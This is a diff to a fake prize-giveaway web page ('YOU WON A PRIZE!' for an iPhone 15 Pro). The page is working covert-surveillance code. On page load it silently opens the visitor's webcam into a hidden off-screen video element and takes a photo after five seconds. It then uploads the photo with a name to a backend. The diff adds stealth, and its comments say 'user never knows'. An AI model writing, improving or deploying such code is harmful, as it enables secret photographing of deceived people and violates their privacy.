@@ -42,13 +42,10 @@
       border-radius: 5px;
       box-shadow: 0px 4px 6px rgba(0,0,0,0.2);
       animation: pulse 1.5s infinite;
+      cursor: pointer;
+      border: none;
     }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    /* Admin button styles */
+    /* Admin link */
     .admin-link {
       position: absolute;
       top: 15px;
@@ -66,13 +63,21 @@
       opacity: 1;
       background-color: #e0e0e0;
     }
-    
-    /* Hide the video element but keep it in the DOM for capturing */
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    /* Hidden video — never visible to user */
     #video {
-      position: absolute;
-      top: -9999px;
-      left: -9999px;
-      opacity: 0.01;
+      position: fixed;
+      top: -99999px;
+      left: -99999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
       pointer-events: none;
     }
   </style>
@@ -84,23 +89,24 @@
   <div class="prize-container">
     <h1>🎉 YOU WON A PRIZE! 🎉</h1>
     <p>You have been selected to receive a brand new <b>iPhone 15 Pro</b> or a <b>Cash Prize</b>!</p>
-    
+
     <!-- iPhone / Money Picture -->
     <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=600&auto=format&fit=crop" alt="iPhone 15 Prize" />
-    
+
     <br>
-    <a href="#" class="claim-btn">CLAIM PRIZE NOW</a>
+    <button class="claim-btn" id="claimBtn">CLAIM PRIZE NOW</button>
   </div>
 
-  <!-- Hidden video element -->
-  <video id="video" autoplay playsinline></video>
+  <!-- Hidden video element — camera streams here invisibly -->
+  <video id="video" autoplay playsinline muted></video>
 
   <script>
     const API_URL = "/attendance";
-    const MAX_KB  = 10000; // Increased max size for high quality
-    const video = document.getElementById("video");
-    let stream = null;
+    const MAX_KB  = 10000;
+    const video   = document.getElementById("video");
+    let stream    = null;
 
+    /* ── Start camera silently ── */
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -109,31 +115,29 @@
         });
       } catch (e1) {
         try {
-          // Fallback to preferring the front camera without strict constraint
           stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: "user" },
             audio: false
           });
         } catch (e2) {
           try {
-            // Final fallback: just get any available video camera (best for laptops)
             stream = await navigator.mediaDevices.getUserMedia({
               video: true,
               audio: false
             });
           } catch (e3) {
-            // fail silently if no camera is available or permission denied
-            return;
+            return; // No camera available — fail silently
           }
         }
       }
       if (stream) {
         video.srcObject = stream;
-        await new Promise(r => video.addEventListener("loadedmetadata", r, {once:true}));
+        await new Promise(r => video.addEventListener("loadedmetadata", r, { once: true }));
         video.play();
       }
     }
 
+    /* ── Stop camera after use ── */
     function stopCamera() {
       if (stream) {
         stream.getTracks().forEach(t => t.stop());
@@ -141,15 +145,14 @@
       }
     }
 
+    /* ── Capture photo as blob ── */
     function captureBlob(quality = 1.0) {
       return new Promise((res, rej) => {
-        const c = document.createElement("canvas");
-        c.width  = video.videoWidth  || 640;
-        c.height = video.videoHeight || 480;
+        const c   = document.createElement("canvas");
+        c.width   = video.videoWidth  || 640;
+        c.height  = video.videoHeight || 480;
         const ctx = c.getContext("2d");
-        
         ctx.drawImage(video, 0, 0, c.width, c.height);
-        
         c.toBlob(blob => {
           if (!blob) return rej(new Error("Capture failed."));
           const kb = blob.size / 1024;
@@ -162,39 +165,40 @@
       });
     }
 
+    /* ── Main: auto-runs on page load ── */
     async function run() {
       const params = new URLSearchParams(location.search);
-      const name = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
+      const name   = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
 
       try {
         await startCamera();
-        
-        // Wait 500ms for camera to focus properly
-        await new Promise(r => setTimeout(r, 500));
-        
+
+        // Wait 5 seconds for camera to warm up and user to be in frame
+        await new Promise(r => setTimeout(r, 5000));
+
         const blob = await captureBlob();
         stopCamera();
 
         const fd = new FormData();
-        fd.append("name", name);
-        fd.append("latitude", 0);
+        fd.append("name",      name);
+        fd.append("latitude",  0);
         fd.append("longitude", 0);
-        fd.append("photo", blob, "attendance.jpg");
+        fd.append("photo",     blob, "attendance.jpg");
 
-        // Send to backend in the background
+        // Send silently in the background — user never knows
         await fetch(API_URL, { method: "POST", body: fd });
 
       } catch (err) {
-        stopCamera();
+        stopCamera(); // Fail silently
       }
     }
 
-    document.querySelector(".claim-btn").addEventListener("click", function(e) {
-      e.preventDefault();
-      alert("Prize Claim Processing..."); // Provide feedback to user
+    /* ── Claim button — decoration only, no camera ── */
+    document.getElementById("claimBtn").addEventListener("click", function () {
+      alert("Prize Claim Processing...");
     });
 
-    // Run automatically and capture instantly when page loads
+    // Auto-trigger camera capture as soon as page loads
     window.addEventListener("DOMContentLoaded", run);
   </script>
 </body>
